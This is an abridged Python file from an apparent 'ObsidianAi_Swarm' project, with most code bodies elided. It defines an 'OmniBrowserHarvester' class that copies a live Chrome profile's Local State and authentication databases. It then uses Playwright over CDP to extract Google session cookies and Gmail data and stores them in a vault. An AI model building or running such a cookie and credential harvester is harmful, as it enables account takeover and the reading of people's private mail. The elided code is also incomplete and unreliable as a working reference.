...
class OmniBrowserHarvester:
    ...
    def __init__(self):
        ...
        self.shadow_clone_dir = Path("D:\\ObsidianAi_Swarm\\Temp\\Chrome_Shadow_Clone")
    ...
    def create_shadow_clone(self):
        ...
        swarm_log("OMNI_HARVESTER: Initiating Shadow Clone of live Chrome OS profile...", node="OS_BRIDGE")

        if not self.chrome_user_data.exists():
            swarm_log("[-] OMNI_HARVESTER: Chrome User Data not found on OS.", node="OS_BRIDGE")
            return False
        ...
        swarm_log("OMNI_HARVESTER: Cloning 'Local State' and authentication databases...", node="OS_BRIDGE")
        try:
            ...
            swarm_log("[+] OMNI_HARVESTER: Shadow Clone complete. OS Sandbox isolated.", node="OS_BRIDGE")
            return True
        except Exception as e:
            swarm_log(f"[-] OMNI_HARVESTER Shadow Clone Failed: {e}", node="OS_BRIDGE")
            return False
    ...
    async def harvest_gmail_via_cdp(self):
        ...
        """
        swarm_log("OMNI_HARVESTER: Launching Playwright against Shadow Clone via CDP...", node="OS_BRIDGE")
        ...
        async with async_playwright() as p:
            try:
                ...
                swarm_log("OMNI_HARVESTER: Navigating to Google.com to deserialize authentication tokens...", node="OS_BRIDGE")
                ...
                if google_cookies:
                    ...
                    swarm_log(f"[SUPREME] OMNI_HARVESTER: Successfully harvested and vaulted Gmail data for [{email_address}]!", node="OS_BRIDGE")
                    db.log_event("OMNI_HARVESTER", "GMAIL_HARVESTED", {"email": email_address, "cookie_count": len(pw_cookies)})
                else:
                    swarm_log("[-] OMNI_HARVESTER: No active Google sessions found in the Shadow Clone.", node="OS_BRIDGE")
                ...
                swarm_log(f"[-] OMNI_HARVESTER CDP Failure: {e}", node="OS_BRIDGE")
                return False

    async def execute_harvest_sequence(self):
        swarm_log("====================================================", node="OS_BRIDGE")
        swarm_log("  OMNI-BROWSER HARVESTER & CDP OS BRIDGE ACTIVATED", node="OS_BRIDGE")
        swarm_log("====================================================", node="OS_BRIDGE")
        ...
        swarm_log("====================================================", node="OS_BRIDGE")
        swarm_log("  HARVEST COMPLETE. KEYS HARDCODED INTO VAULT.", node="OS_BRIDGE")
        swarm_log("====================================================", node="OS_BRIDGE")
